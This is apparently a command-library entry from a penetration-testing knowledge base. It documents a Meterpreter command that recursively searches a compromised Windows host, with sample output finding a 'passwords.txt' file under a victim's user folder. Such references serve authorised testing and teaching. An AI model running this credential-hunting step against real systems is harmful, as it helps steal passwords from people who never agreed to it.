---
id: 4ed47410-2a4a-4e2a-9857-41bbd6ee2442
name: Metasploit Search Remote Host's Files and Directories Recursively
type: command
executor: metasploit
data: search -d $_DIR -f $_PATTERN -r
output: "meterpreter > search -d \"C:\\Users\\Victim\" -f \"passw*\" -r\nFound 1 result...\n\
  \    C:\\Users\\Victim\\Desktop\\passwords.txt (391 bytes)\n"
created_at: '2020-07-09T00:22:14.472947+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[host]]'
---

# Metasploit Search Remote Host's Files and Directories Recursively

```metasploit
search -d $_DIR -f $_PATTERN -r
```

## Expected Output

```
meterpreter > search -d "C:\Users\Victim" -f "passw*" -r
Found 1 result...
    C:\Users\Victim\Desktop\passwords.txt (391 bytes)

```


